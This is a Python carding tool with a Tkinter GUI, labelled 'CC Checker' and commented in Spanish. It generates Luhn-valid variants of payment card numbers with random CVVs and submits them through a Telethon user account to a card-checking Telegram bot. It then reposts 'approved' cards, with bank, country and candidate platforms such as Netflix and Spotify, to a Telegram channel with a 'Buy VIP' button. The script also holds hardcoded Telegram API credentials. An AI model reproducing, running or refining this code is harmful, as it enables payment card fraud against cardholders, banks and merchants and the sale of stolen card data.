import sys
import csv
import re
import threading
import asyncio
import random
import time
from telethon import TelegramClient, events, Button
from telethon.errors import RPCError, SessionPasswordNeededError, FloodWaitError
from telethon.tl.types import PeerChannel, PeerUser, PeerChat
from colorama import Fore, Style
import tkinter as tk
from tkinter import scrolledtext, simpledialog

API_ID = 22154650
API_HASH = "2b554e270efb419af271c47ffe1d72d3"
SESSION_NAME = "session"

client = None


# Ruta de archivos (corregida)
base_path = r"D:\TODO\Basu\dilong\Scrapper Riuk"
ccs_file = f"{base_path}\\ccs.txt"
bins_file = f"{base_path}\\bins.txt"
cmds_file = f"{base_path}\\cmds.txt"
image_path = f"{base_path}\\x1.jpg"
channel_id = "https://t.me/+WsL6Ak_jchBlNDkx"  # Canal de destino por defecto

# Contadores globales
approved_count = 0
declined_count = 0

# Variables globales para la interfaz
text_log = None
top = None

# Función para validar tarjetas con el algoritmo de Luhn
def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d*2))
    return checksum % 10 == 0

# Función para generar un dígito de verificación válido según Luhn
def generate_luhn_digit(partial_card_number):
    # Calcular qué dígito necesitamos para que el número completo pase la verificación Luhn
    checksum = 0
    for i, digit in enumerate(reversed(partial_card_number)):
        d = int(digit)
        if i % 2 == 0:
            checksum += d
        else:
            checksum += sum(int(x) for x in str(d * 2))
    
    # El dígito que necesitamos es el que hace que el checksum sea divisible por 10
    return (10 - (checksum % 10)) % 10

# Función para generar variantes de tarjetas con algoritmo de Luhn
def generate_cc_variants(cc_base, count=10):
    # Asumimos que cc_base ya tiene el formato XXXXXXXXXXXXXXXX|MM|YY
    parts = cc_base.strip().split('|')
    if len(parts) < 3:
        return []
    
    card_number = parts[0]
    month = parts[1]
    year = parts[2]
    
    # Quitamos los últimos 4 dígitos
    base_number = card_number[:-4]
    variants = []
    
    # Generamos 'count' variantes
    while len(variants) < count:
        # Generamos 3 dígitos aleatorios
        random_digits = f"{random.randint(0, 9)}{random.randint(0, 9)}{random.randint(0, 9)}"
        
        # Calculamos el último dígito para que cumpla con Luhn
        partial_number = base_number + random_digits
        luhn_digit = generate_luhn_digit(partial_number)
        
        # Formamos el número completo
        complete_number = partial_number + str(luhn_digit)
        
        # Verificamos que cumpla con Luhn (por seguridad)
        if luhn_checksum(complete_number):
            # Generamos un CVV aleatorio entre 100 y 999
            cvv = random.randint(100, 999)
            # Formamos la CC completa
            variant = f"{complete_number}|{month}|{year}|{cvv}"
            if variant not in variants:  # Evitamos duplicados
                variants.append(variant)
    
    return variants

def update_terminal_counter():
    print(f"{Fore.GREEN}Approved: {approved_count}{Style.RESET_ALL} | {Fore.RED}Declined: {declined_count}{Style.RESET_ALL}", end="\r", flush=True)
    if text_log:
        text_log.insert(tk.END, f"Approved: {approved_count} | Declined: {declined_count}\n")
        text_log.see(tk.END)

def load_commands():
    try:
        with open(cmds_file, "r", encoding="utf-8") as f:
            return [line.strip() for line in f.readlines() if line.strip()]
    except Exception as e:
        print(f"[ERROR] Error cargando comandos: {e}")
        return []

# Función para resolver el ID del canal/chat (público o privado)
async def resolve_channel_id(channel_input):
    try:
        # Si es un nombre de usuario (comienza con @)
        if channel_input.startswith('@'):
            return channel_input
        
        # Si es un enlace de invitación
        elif 't.me/' in channel_input:
            # Extraer el nombre del canal o el hash de invitación
            parts = channel_input.split('t.me/')
            if len(parts) > 1:
                invite_part = parts[1]
                # Si es un enlace de canal público
                if not '+' in invite_part and not 'joinchat' in invite_part:
                    return '@' + invite_part
                # Si es un enlace de invitación privado
                else:
                    # Intentamos unirse al canal/chat si es una invitación
                    try:
                        updates = await client(ImportChatInviteRequest(invite_part.split('/')[-1]))
                        # Extraer el ID del chat/canal de la respuesta
                        for update in updates.updates:
                            if hasattr(update, 'chat_id'):
                                return update.chat_id
                    except Exception as e:
                        print(f"[ERROR] No se pudo unir al chat/canal: {e}")
                        return None
        
        # Si es un ID numérico
        elif channel_input.isdigit() or (channel_input.startswith('-') and channel_input[1:].isdigit()):
            return int(channel_input)
        
        # Intentar resolver como entidad
        try:
            entity = await client.get_entity(channel_input)
            if hasattr(entity, 'id'):
                return entity.id
        except Exception as e:
            print(f"[ERROR] No se pudo resolver la entidad: {e}")
        
        return None
    except Exception as e:
        print(f"[ERROR] Error al resolver ID del canal: {e}")
        return None
import re
import random

PLATAFORMAS = [
    ("Eneba", ["/au", "/ray", "/ch"]),
    ("GeForce Now", ["/au"]),
    ("Duolingo", ["/py"]),
    ("Spotify", ["/bp", "/cyb"]),
    ("Aliexpress", ["/au", "/ch"]),
    ("Google Play", ["/bp"]),
    ("OnlyFans", ["/py", "/shy", "/ray"]),
    ("Twitch", ["/rc", "/cyb", "/py"]),
    ("Temu", ["/bp"]),
    ("Vix", ["/rc", "/cyb", "/ch"]),
    ("Deezer", ["/au"]),
    ("Rakuten Viki", ["/py"]),
    ("NordVPN", ["/pass"]),
    ("Shein", ["/vbv", "/shy", "/ch"]),
    ("Crunchyroll", ["/cyb"]),
    ("Amc+", ["/py"]),
    ("PureVPN", ["/rc"]),
    ("Picsart", ["/au"]),
    ("Atresplayer", ["/au"]),
    ("Paramount Plus", ["/py", "/bp"]),
    ("AliExpress", ["/au", "/ch"]),
    ("Etsy", ["/au"]),
    ("Apple TV", ["/py", "/bp"]),
    ("Disney Plus", ["/cyb", "/shy"]),
    ("Star Plus", ["/cyb", "/shy"]),
    ("Amazon Prime", ["/cyb"]),
    ("Prime Gaming", ["/cyb"]),
    ("Prime Video", ["/cyb"]),
    ("HBO Max", ["/cyb"]),
    ("Netflix", ["/fw"]),
    ("YouTube Music", ["/bp"]),
    ("YouTube", ["/bp"]),
    ("Direct TV", ["/ad"]),
    ("DirectTV", ["/ad"]),
    ("AMC+", ["/py"]),
    ("Vix", ["/cyb", "/ch"]),
    ("PureVPN", ["/rc"]),
    ("NordVPN", ["/pass"]),
    ("GeForce Now", ["/au"]),
    ("Eneba", ["/ray", "/ch"]),
    ("Shein", ["/shy", "/ch"]),
    ("OnlyFans", ["/shy", "/ray"]),
    ("Etsy", ["/au"]),
    ("Temu", ["/bp"]),
    ("Deezer", ["/au"]),
    ("Atresplayer", ["/au"]),
    ("Rakuten Viki", ["/py"]),
    ("Picsart", ["/au"]),
    ("Apple TV", ["/py", "/bp"]),
]

def plataformas_nombres_por_codigo(codigo):
    return [nombre for nombre, codigos in PLATAFORMAS if codigo in codigos]

async def response_handler(event):
    global approved_count, declined_count, text_log, channel_id
    message_text = event.message.message.lower()

    if "approved" in message_text:
        approved_count += 1
        if text_log:
            text_log.insert(tk.END, f"✅ Approved: {event.message.message}\n", "green")

        lines = event.message.message.splitlines()
        cc_number = ""
        status = ""
        response = ""
        country = ""
        bank = ""
        card_type = ""
        gate = ""
        gate_code = ""

        for line in lines:
            if "gate:" in line.lower():
                gate = line.split(":", 1)[1].strip()
                # Busca el código entre paréntesis, ej: /au
                match = re.search(r'\((\/[a-zA-Z0-9\s]+)\)', line)
                if match:
                    gate_code = match.group(1).strip()
                else:
                    # Fallback si solo viene el código
                    possible_codes = ["/au", "/cyb", "/bp", "/ch", "/py", "/pass", "/shy", "/ray", "/vbv", "/rc", "/fw", "/ad"]
                    for cod in possible_codes:
                        if cod in line:
                            gate_code = cod
                            break
            elif "cc:" in line.lower():
                cc_number = line.split(":", 1)[1].strip() if len(line.split(":", 1)) > 1 else ""
            elif "status:" in line.lower():
                status = line.split(":", 1)[1].strip() if len(line.split(":", 1)) > 1 else ""
            elif "response:" in line.lower():
                response = line.split(":", 1)[1].strip() if len(line.split(":", 1)) > 1 else ""
            elif "country:" in line.lower():
                country = line.split(":", 1)[1].strip() if len(line.split(":", 1)) > 1 else ""
            elif "bank:" in line.lower():
                bank = line.split(":", 1)[1].strip() if len(line.split(":", 1)) > 1 else ""
            elif "type:" in line.lower():
                card_type = line.split(":", 1)[1].strip() if len(line.split(":", 1)) > 1 else ""

        # Solo nombres de plataformas del código, o 1 al azar si no hay coincidencia
        if gate_code:
            plataformas_lista = plataformas_nombres_por_codigo(gate_code)
            if plataformas_lista:
                plataformas_msg = "PLATAFORMA POSIBLE:\n" + "\n".join(plataformas_lista)
            else:
                plataformas_msg = "PLATAFORMA POSIBLE:\n" + random.choice([nombre for nombre, _ in PLATAFORMAS])
        else:
            plataformas_msg = "PLATAFORMA POSIBLE:\n" + random.choice([nombre for nombre, _ in PLATAFORMAS])

        formatted_message = (
            "🐉 scr vip rda🐉\n"
            "=========================\n"
            f"**CC:** `{cc_number}`\n"
            f"**Status:** `{status}`\n"
            f"**Response:** `{response}`\n"
            f"**Country:** `{country}`\n"
            f"**Bank:** `{bank}`\n"
            f"**Type:** `{card_type}`\n"
            f"**GATE:** `{gate}`\n"
            "=========================\n\n"
            f"{plataformas_msg}"
        )

        buttons = [
            [Button.url("🔥 Buy VIP", "https://t.me/rush_net")]
        ]

        try:
            await client.send_file(
                channel_id,
                image_path,
                caption=formatted_message,
                buttons=buttons,
                parse_mode="markdown"
            )
        except Exception as e:
            print(f"[ERROR] Error al enviar mensaje al canal: {e}")
            if text_log:
                text_log.insert(tk.END, f"❌ Error al enviar mensaje al canal: {e}\n", "red")

    elif "declined" in message_text:
        declined_count += 1
        if text_log:
            text_log.insert(tk.END, f"❌ Declined: {event.message.message}\n", "red")

    update_terminal_counter()


async def send_to_bot():
    print("[INFO] Iniciando envío de CCs al bot de Telegram...")
    while True:
        try:
            print("[INFO] Leyendo archivo ccs.txt...")
            with open(ccs_file, "r", encoding="utf-8") as f:
                ccs_list = f.readlines()
            
            # Si hay CCs, procesamos el archivo y lo limpiamos
            if ccs_list:
                # Tomamos la primera CC
                current_cc = ccs_list[0].strip()
                
                # Guardamos las CCs restantes (si hay más de una)
                if len(ccs_list) > 1:
                    with open(ccs_file, "w", encoding="utf-8") as f:
                        f.writelines(ccs_list[1:])
                else:
                    # Si era la última CC, limpiamos el archivo
                    with open(ccs_file, "w", encoding="utf-8") as f:
                        f.write("")
                
                # Generamos variantes de la CC actual
                print(f"[INFO] Generando variantes para: {current_cc}")
                cc_variants = generate_cc_variants(current_cc, 10)
                
                if not cc_variants:
                    print(f"[ERROR] No se pudieron generar variantes para: {current_cc}")
                    if text_log:
                        text_log.insert(tk.END, f"❌ No se pudieron generar variantes para: {current_cc}\n", "red")
                    continue
                
                # Cargamos los comandos
                print("[INFO] Cargando comandos desde cmds.txt...")
                commands = load_commands()
                if not commands:
                    print("[ERROR] No hay comandos disponibles en cmds.txt")
                    if text_log:
                        text_log.insert(tk.END, "❌ No hay comandos disponibles en cmds.txt\n", "red")
                    await asyncio.sleep(20)
                    continue
                # Seleccionamos un comando aleatorio para esta ronda
                selected_command = random.choice(commands)
                print(f"[INFO] Comando seleccionado: {selected_command}")
                
                # Función asíncrona para enviar un mensaje
                async def send_message_async(message):
                    try:
                        if not await client.is_user_authorized():
                            print("[ERROR] Cliente no autorizado. Verifica las credenciales de Telegram.")
                            if text_log:
                                text_log.insert(tk.END, "❌ Cliente no autorizado. Verifica las credenciales de Telegram.\n", "red")
                            return
                        print(f"[INFO] Enviando mensaje: {message}")
                        if text_log:
                            text_log.insert(tk.END, f"⏳ Enviando: {message}\n", "blue")
                            text_log.see(tk.END)
                        await client.send_message("@Alphachekerbot", message)
                        print("[SUCCESS] Mensaje enviado correctamente.")
                    except FloodWaitError as e:
                        print(f"[WARNING] Telegram limitó el envío de mensajes, esperando {e.seconds} segundos...")
                        if text_log:
                            text_log.insert(tk.END, f"⚠️ Telegram limitó el envío, esperando {e.seconds} segundos...\n", "red")
                        await asyncio.sleep(e.seconds)
                    except RPCError as e:
                        print(f"[ERROR] Error RPC al enviar mensaje: {e}")
                        if text_log:
                            text_log.insert(tk.END, f"❌ Error RPC: {e}\n", "red")
                    except OSError as e:
                        print(f"[ERROR] Error de conexión: {e}. Intentando reconectar en 10 segundos...")
                        if text_log:
                            text_log.insert(tk.END, f"❌ Error de conexión: {e}\n", "red")
                    except Exception as e:
                        print(f"[ERROR] Error desconocido: {e}")
                        if text_log:
                            text_log.insert(tk.END, f"❌ Error desconocido: {e}\n", "red")

                # Enviamos las variantes en pares concurrentemente
                for i in range(0, len(cc_variants), 2):
                    pair = cc_variants[i:i+2]
                    tasks = []
                    for cc in pair:
                        selected_command = random.choice(commands)  # Elegir comando aleatorio para cada variante
                        print(f"[INFO] Comando seleccionado: {selected_command}")
                        message = f"{selected_command} {cc}"
                        tasks.append(send_message_async(message))
                    await asyncio.gather(*tasks)
                    await asyncio.sleep(21)  # Esperamos entre pares de envíos
            else:
                print("[INFO] No hay más CC en ccs.txt. Esperando...")
                if text_log:
                    text_log.insert(tk.END, "⚠️ No hay más CC en ccs.txt. Esperando...\n", "blue")
                await asyncio.sleep(20)
        except Exception as e:
            print(f"[ERROR] Error procesando ccs.txt: {e}")
            if text_log:
                text_log.insert(tk.END, f"❌ Error procesando ccs.txt: {e}\n", "red")
            await asyncio.sleep(20)

async def start_client():
    global client
    print("[INFO] Iniciando cliente de Telegram...")
    try:
        client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
        await client.start()  # Maneja conexión y autenticación automáticamente
        print("[SUCCESS] Cliente autenticado correctamente.")
        if text_log:
            text_log.insert(tk.END, "✅ Cliente autenticado correctamente.\n", "green")
        # Register the event handler after client is initialized
        client.add_event_handler(response_handler, events.MessageEdited(chats="@Alphachekerbot"))
        await asyncio.gather(send_to_bot(), client.run_until_disconnected())
    except Exception as e:
        print(f"[ERROR] Error al iniciar cliente: {e}")
        if text_log:
            text_log.insert(tk.END, f"❌ Error al iniciar cliente: {e}\n", "red")

# Función para cambiar el canal de destino
def change_channel():
    global channel_id, text_log
    new_channel = simpledialog.askstring("Cambiar Canal", "Ingresa el nuevo canal/chat de destino:\n(Puede ser @username, ID numérico, o enlace de invitación)", parent=top)
    
    if new_channel:
        # Ejecutar en un hilo separado para no bloquear la GUI
        async def update_channel():
            resolved_id = await resolve_channel_id(new_channel)
            if resolved_id:
                global channel_id
                channel_id = resolved_id
                print(f"[INFO] Canal de destino cambiado a: {channel_id}")
                if text_log:
                    text_log.insert(tk.END, f"✅ Canal de destino cambiado a: {channel_id}\n", "green")
            else:
                print(f"[ERROR] No se pudo resolver el canal: {new_channel}")
                if text_log:
                    text_log.insert(tk.END, f"❌ No se pudo resolver el canal: {new_channel}\n", "red")
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(update_channel())
        loop.close()

# Función para iniciar la interfaz gráfica
def init_gui():
    global text_log, top
    
    # Crear interfaz gráfica
    top = tk.Tk()
    top.title("CC Checker GUI")
    top.geometry("500x650")
    
    # Frame para botones
    button_frame = tk.Frame(top)
    button_frame.pack(fill=tk.X, padx=10, pady=5)
    
    # Botón para cambiar canal
    change_channel_btn = tk.Button(button_frame, text="Cambiar Canal", command=change_channel)
    change_channel_btn.pack(side=tk.LEFT, padx=5)
    
    # Etiqueta para mostrar el canal actual
    channel_label = tk.Label(button_frame, text=f"Canal actual: {channel_id}")
    channel_label.pack(side=tk.LEFT, padx=5)
    
    # Área de texto para logs
    text_log = scrolledtext.ScrolledText(top, wrap=tk.WORD, width=60, height=30)
    text_log.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
    text_log.tag_config("green", foreground="green")
    text_log.tag_config("red", foreground="red")
    text_log.tag_config("blue", foreground="blue")
    
    text_log.insert(tk.END, "Iniciando CC Checker...\n", "blue")
    
    # Ejecutar el cliente de Telegram en un hilo separado
    def run_async():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(start_client())
        loop.close()
    
    threading.Thread(target=run_async, daemon=True).start()
    
    # Función para actualizar la etiqueta del canal
    def update_channel_label():
        channel_label.config(text=f"Canal actual: {channel_id}")
        top.after(1000, update_channel_label)  # Actualizar cada segundo
    
    update_channel_label()
    
    # Mantener la interfaz gráfica activa
    top.mainloop()

# Iniciar la aplicación
if __name__ == "__main__":
    # Importar la función para unirse a canales privados
    try:
        from telethon.tl.functions.messages import ImportChatInviteRequest
    except ImportError:
        print("[WARNING] No se pudo importar ImportChatInviteRequest. La funcionalidad de unirse a canales privados podría no funcionar.")
    
    init_gui()
